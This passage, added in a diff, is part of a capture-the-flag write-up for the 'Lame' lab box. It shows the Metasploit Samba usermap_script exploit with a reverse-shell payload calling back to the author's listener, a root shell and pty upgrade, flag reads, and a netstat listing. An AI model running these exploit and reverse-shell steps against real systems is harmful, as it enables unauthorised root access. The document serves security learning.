@@ -119,3 +119,100 @@ Samba < 3.6.2 (x86) - Denial of Service (PoC)                                   
 ----------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
+The only one that was intresting for me was this:
+```Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)```
+
+# Exploit
+I tried the FTP exploit and it didn't work :( . so moving on to SAMBA
+
+## SAMBA
+So we can now use Metasploit to exploit it.
+```
+msf5 > use exploit/multi/samba/usermap_script
+msf5 exploit(multi/samba/usermap_script) > set payload cmd/unix/reverse
+msf5 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
+msf5 exploit(multi/samba/usermap_script) > set lhost 10.10.14.19
+msf5 exploit(multi/samba/usermap_script) > exploit
+```
+And we got our shell as root :)
+
+```
+msf5 exploit(multi/samba/usermap_script) > exploit                                                                                                                               
+[*] Started reverse TCP double handler on 10.10.14.19:443                                                                                                                         
+[*] Accepted the first client connection...                                                                                                                                       
+[*] Accepted the second client connection...                                                                                                                                     
+[*] Command: echo zQrCq3SiPcn0h80W;                                                                                                                                               
+[*] Writing to socket A                                                                                                                                                           
+[*] Writing to socket B                                                                                                                                                           
+[*] Reading from sockets...                                                                                                                                                       
+[*] Reading from socket B                                                                                                                                                         
+[*] B: "zQrCq3SiPcn0h80W\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.10.14.19:443 -> 10.10.10.3:45899) at 2020-08-08 22:16:58 -0400
+
+id
+uid=0(root) gid=0(root)
+```
+
+Let's upgrade our shell like this
+
+```
+python -c 'import pty; pty.spawn("bash")'
+root@lame:/# 
+```
+Now we can get the flags ;)
+
+```
+cat root.txt
+92caac3be140e...
+```
+The ```user.txt``` is in ```makis``` home directory
+```
+root@lame:/home/makis# cat user.txt
+cat user.txt
+69454a937d...
+```
+Afte I got to this point I was cuiros to know why the ftp exploit didn't work and I found that the Firewall is blocking most of it.
+```
+root@lame:/home/makis# netstat -tnlp
+netstat -tnlp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:512             0.0.0.0:*               LISTEN      5041/xinetd     
+tcp        0      0 0.0.0.0:513             0.0.0.0:*               LISTEN      5041/xinetd     
+tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:514             0.0.0.0:*               LISTEN      5041/xinetd     
+tcp        0      0 0.0.0.0:8009            0.0.0.0:*               LISTEN      5149/jsvc       
+tcp        0      0 0.0.0.0:6697            0.0.0.0:*               LISTEN      5196/unrealircd 
+tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      4764/mysqld     
+tcp        0      0 0.0.0.0:1099            0.0.0.0:*               LISTEN      5190/rmiregistry
+tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN      5196/unrealircd 
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      5018/smbd       
+tcp        0      0 0.0.0.0:5900            0.0.0.0:*               LISTEN      5213/Xtightvnc  
+tcp        0      0 0.0.0.0:49582           0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      4222/portmap    
+tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      5213/Xtightvnc  
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      5169/apache2    
+tcp        0      0 0.0.0.0:60370           0.0.0.0:*               LISTEN      4240/rpc.statd  
+tcp        0      0 0.0.0.0:8787            0.0.0.0:*               LISTEN      5194/ruby       
+tcp        0      0 0.0.0.0:8180            0.0.0.0:*               LISTEN      5149/jsvc       
+tcp        0      0 0.0.0.0:1524            0.0.0.0:*               LISTEN      5041/xinetd     
+tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      5041/xinetd     
+tcp        0      0 10.10.10.3:53           0.0.0.0:*               LISTEN      4617/named      
+tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      4617/named      
+tcp        0      0 0.0.0.0:58966           0.0.0.0:*               LISTEN      5190/rmiregistry
+tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      5041/xinetd     
+tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      4845/postgres   
+tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      5008/master     
+tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      4617/named      
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      5018/smbd       
+tcp        0      0 0.0.0.0:42815           0.0.0.0:*               LISTEN      4940/rpc.mountd 
+tcp6       0      0 :::2121                 :::*                    LISTEN      5087/proftpd: (acce
+tcp6       0      0 :::3632                 :::*                    LISTEN      4872/distccd    
+tcp6       0      0 :::53                   :::*                    LISTEN      4617/named      
+tcp6       0      0 :::22                   :::*                    LISTEN      4641/sshd       
+tcp6       0      0 :::5432                 :::*                    LISTEN      4845/postgres   
+tcp6       0      0 ::1:953                 :::*                    LISTEN      4617/named      
+```
+Thanks for reading and you can find me here on Twitter: ```https://twitter.com/electronicbots```
